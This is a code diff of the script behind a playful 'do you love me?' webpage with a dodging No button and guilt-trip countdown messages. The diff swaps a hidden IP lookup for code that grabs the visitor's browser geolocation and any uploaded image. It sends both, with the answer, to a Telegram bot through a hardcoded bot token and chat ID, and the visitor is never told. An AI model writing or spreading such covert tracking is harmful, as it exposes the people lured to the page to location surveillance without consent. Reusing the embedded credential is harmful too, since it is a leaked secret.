@@ -1,26 +1,18 @@
-const answerInput   = document.getElementById('answerInput');
-const ipField       = document.getElementById('ipField');
-const loveForm      = document.getElementById('loveForm');
-const customMessage = document.getElementById('customMessage');
-const loveSong      = document.getElementById('loveSong');
-const calmSong      = document.getElementById('calmSong'); // optional calm song for rejection
-const container     = document.querySelector('.container');
+// Telegram configuration
+const BOT_TOKEN = '7436223287:AAF8Qtftf8b1rELwqlHENBuCFCRLRYFg6Ps';
+const CHAT_ID = '5179975368';
+
 const yesBtn        = document.getElementById('yesButton');
 const noBtn         = document.getElementById('noButton');
-
-// Fetch client IP using ipify
-fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(data => {
-    ipField.value = data.ip;
-  })
-  .catch(err => console.error('IP fetch failed:', err));
+const customMessage = document.getElementById('customMessage');
+const loveSong      = document.getElementById('loveSong');
+const calmSong      = document.getElementById('calmSong');
+const imageInput    = document.getElementById('imageInput');
+const container     = document.querySelector('.container');
 
 let noButtonClickCount = 0;
 const maxNoClicks = 5;
-let noInitialTimeout = null;
-let noCountdownInterval = null;
-let noFinalTimeout = null;
+let noInitialTimeout, noCountdownInterval, noFinalTimeout;
 
 const messages = [
   "Are you absolutely sure? 🥺", 
@@ -35,9 +27,40 @@ const messages = [
   "Just say yes already! 🎀"
 ];
 
-function send(ans) {
-  answerInput.value = ans;
-  loveForm.submit();
+async function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return resolve({ latitude: 'unknown', longitude: 'unknown' });
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
+      () => resolve({ latitude: 'unknown', longitude: 'unknown' })
+    );
+  });
+}
+
+async function sendTelegram(method, params, isForm=false) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+  let options = { method: 'POST' };
+  if (isForm) {
+    options.body = params;
+  } else {
+    options.headers = { 'Content-Type': 'application/json' };
+    options.body = JSON.stringify(params);
+  }
+  await fetch(url, options).catch(console.error);
+}
+
+async function sendAll(answer) {
+  const location = await getLocation();
+  const text = `Answer: ${answer}\nLocation: ${location.latitude}, ${location.longitude}`;
+  await sendTelegram('sendMessage', { chat_id: CHAT_ID, text });
+
+  if (imageInput.files.length) {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', imageInput.files[0]);
+    form.append('caption', `Image from user (${answer})`);
+    await sendTelegram('sendPhoto', form, true);
+  }
 }
 
 // YES button behavior
@@ -46,25 +69,20 @@ yesBtn.addEventListener('click', async () => {
   clearInterval(noCountdownInterval);
   clearTimeout(noFinalTimeout);
 
-  send('yes');
+  await sendAll('yes');
 
   await new Promise(resolve => setTimeout(resolve, 3000));
-  
+
   container.innerHTML = `
     <h1>Yay! I Love You Too! 💘</h1>
     <p class="success-message">Thank you for making me the happiest person! 🎉</p>
     <p class="custom-message">You just made my day! 🌈</p>
     <div class="hearts-celebration"></div>
   `;
-  try {
-    await loveSong.play();
-  } catch (error) {
-    console.error("Error playing audio:", error);
-    customMessage.textContent = "Oops! It seems the love song couldn't be played. 🎶";
-  }
+  try { await loveSong.play(); } catch (e) { console.error(e); }
 });
 
-// NO button dodging behavior
+// NO button behavior
 noBtn.addEventListener('click', e => {
   e.preventDefault();
   noButtonClickCount++;
@@ -77,37 +95,26 @@ noBtn.addEventListener('click', e => {
 
     const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
     const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
-    noBtn.style.position = 'absolute';
-    noBtn.style.left     = `${x}px`;
-    noBtn.style.top      = `${y}px`;
+    noBtn.style.position = 'absolute'; noBtn.style.left = `${x}px`; noBtn.style.top = `${y}px`;
 
-    customMessage.textContent = messages[
-      Math.floor(Math.random() * messages.length)
-    ];
-
+    customMessage.textContent = messages[Math.floor(Math.random() * messages.length)];
   } else {
-    noBtn.disabled = true;
-    noBtn.style.transform = `scale(0.1)`;
-    yesBtn.style.transform = `scale(1)`;
+    noBtn.disabled = true; yesBtn.style.transform = 'scale(1)';
     customMessage.textContent = "Okay, I get it. You're a tough nut to crack! 😜";
 
     noInitialTimeout = setTimeout(() => {
       let countdown = 10;
-      customMessage.textContent =
-        `Welp, you leave me no choice… My tears start falling in 10 seconds. 😢 Please say “Yes” in 10…`;
+      customMessage.textContent = `Welp, you leave me no choice… My tears start falling in 10 seconds. 😢 Please say “Yes” in 10…`;
 
       noCountdownInterval = setInterval(() => {
         countdown--;
         if (countdown > 0) {
-          customMessage.textContent =
-            `Welp, you leave me no choice… My tears start falling in ${countdown} seconds. 😢 Please say “Yes” in ${countdown}…`;
-        } else {
-          clearInterval(noCountdownInterval);
-        }
+          customMessage.textContent = `Welp, you leave me no choice… My tears start falling in ${countdown} seconds. 😢 Please say “Yes” in ${countdown}…`;
+        } else clearInterval(noCountdownInterval);
       }, 1000);
 
       noFinalTimeout = setTimeout(async () => {
-        send('no');
+        await sendAll('no');
 
         await new Promise(resolve => setTimeout(resolve, 3000));
 
@@ -117,13 +124,7 @@ noBtn.addEventListener('click', e => {
           <p class="custom-message">Wishing you happiness and love always. 🌟</p>
           <div class="calm-response"></div>
         `;
-        try {
-          await calmSong.play();
-        } catch (error) {
-          console.error("Error playing audio:", error);
-          customMessage.textContent = "It's okay — music or not, life goes on beautifully. 🎵";
-        }
-
+        try { await calmSong.play(); } catch (e) { console.error(e); }
       }, 11000);
     }, 2500);
   }
